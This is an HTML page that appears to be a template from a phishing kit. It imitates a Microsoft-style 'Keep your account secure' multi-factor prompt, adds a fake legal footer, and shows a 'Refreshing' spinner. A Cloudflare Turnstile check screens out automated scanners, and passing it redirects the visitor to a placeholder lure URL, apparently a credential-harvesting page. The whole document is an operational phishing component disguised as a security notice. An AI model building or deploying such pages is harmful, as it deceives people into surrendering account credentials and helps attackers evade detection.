<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keep Your Account Secure</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:"Segoe UI",Tahoma,sans-serif;
}

body{
    background:#efefef;
    color:#333;
}

.number-wrap{
    position:relative;
    width:90px;
    height:90px;
    margin:18px auto;
}

.auth-spinner{
    position:absolute;
    inset:0;
    width:100%;
    height:100%;
}

.loading-number{
    position:absolute;
    inset:0;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:28px;
    font-weight:600;
    color:#444;
}

.wrapper{
    max-width:430px;
    margin:18px auto;
}

.page-title{
    text-align:center;
    font-size:18px;
    color:#4b4b4b;
    margin-bottom:10px;
}

.card{
    background:#fff;
    border:1px solid #e2e2e2;
    box-shadow:0 1px 2px rgba(0,0,0,.05);
}

.content{
    padding:18px;
}

.heading{
    font-size:18px;
    color:#555;
    margin-bottom:16px;
}

.row{
    display:flex;
    gap:16px;
    align-items:flex-start;
}

.phone{
    width:48px;
    flex-shrink:0;
}

.try-title{
    font-size:15px;
    color:#555;
    margin-bottom:22px;
}

.desc{
    font-size:11px;
    color:#666;
    line-height:1.4;
}

.number{
    text-align:center;
    font-size:28px;
    font-weight:600;
    color:#444;
    margin:18px 0 14px;
}

.actions{
    display:flex;
    justify-content:flex-end;
    gap:8px;
}

.btn{
    min-width:70px;
    height:30px;
    border:1px solid #bfbfbf;
    background:#fff;
    color:#333;
    font-size:12px;
    cursor:pointer;
}

.btn.disabled{
    background:#f6f6f6;
    color:#c7c7c7;
    border-color:#ececec;
    cursor:default;
}

.footer{
    border-top:1px solid #ececec;
    background:#fafafa;
    padding:10px 12px;
}

.footer a{
    color:#333;
    font-size:11px;
    text-decoration:underline;
}

@media(max-width:480px){
    .wrapper{
        margin:10px;
    }
}
</style>
</head>
<body>

<div class="wrapper">

    <div class="page-title">
        Keep your account secure
    </div>

    <div class="card">

        <div class="content">

            <div class="heading">
                More information needed
            </div>

            <div class="row">

                <div class="phone">
	<svg style="margin-right:4px;" xmlns="http://www.w3.org/2000/svg" width="45" height="45" viewBox="0 0 24 24" fill="none">
  <circle cx="12" cy="8" r="4" fill="#0078D4"/>
  <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" fill="#0078D4"/>
</svg><br>
                </div>

                <div style="flex:1">

                    <div class="try-title">
                        Let's try it out
                    </div>

                    <div class="desc">
                        Your organization needs more information for your request.
                    </div>
<br>
                <div class="phone">
                    <svg viewBox="0 0 60 100" width="48" height="80">
                        <rect x="5" y="3" width="50" height="94" rx="3"
                              fill="#fff"
                              stroke="#7a7a7a"
                              stroke-width="4"/>
                        <path d="M18 28 L26 36 L42 18"
                              fill="none"
                              stroke="#4aa3ff"
                              stroke-width="4"
                              stroke-linecap="round"
                              stroke-linejoin="round"/>
                        <rect x="24" y="82" width="12" height="4" fill="#777"/>
                    </svg>
                </div>
<div class="number">
    <svg width="140" height="22" viewBox="0 0 140 22">
        <circle cx="10" cy="11" r="4" fill="#0078d4">
            <animate attributeName="opacity"
                     values="0.3;1;0.3"
                     dur="1s"
                     repeatCount="indefinite"/>
        </circle>

        <circle cx="30" cy="11" r="4" fill="#0078d4">
            <animate attributeName="opacity"
                     values="0.3;1;0.3"
                     begin=".2s"
                     dur="1s"
                     repeatCount="indefinite"/>
        </circle>

        <circle cx="50" cy="11" r="4" fill="#0078d4">
            <animate attributeName="opacity"
                     values="0.3;1;0.3"
                     begin=".4s"
                     dur="1s"
                     repeatCount="indefinite"/>
        </circle>

<text
    x="68"
    y="15"
    fill="#666"
    font-size="12"
    font-family="'Segoe UI', Arial, sans-serif">
    Refreshing
</text>
    </svg>
</div>
                </div>

            </div>

        </div>

        <div class="footer">
            <a href="#">Communications Privacy Act, 18 U.S.C.</a>
        </div>

    </div>

</div>

<div id="cf-turnstile"></div>

<script>
turnstile.ready(function () {
        turnstile.render('#cf-turnstile', {
            sitekey: '0x4AAAAAADj4aPRS-ObPGB6-', // replace this with your own sitekey
            callback: function(token) {
                window.location.assign({lure_url_js});
            },
        });
    });
</script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script> 
    
</body>
</html>
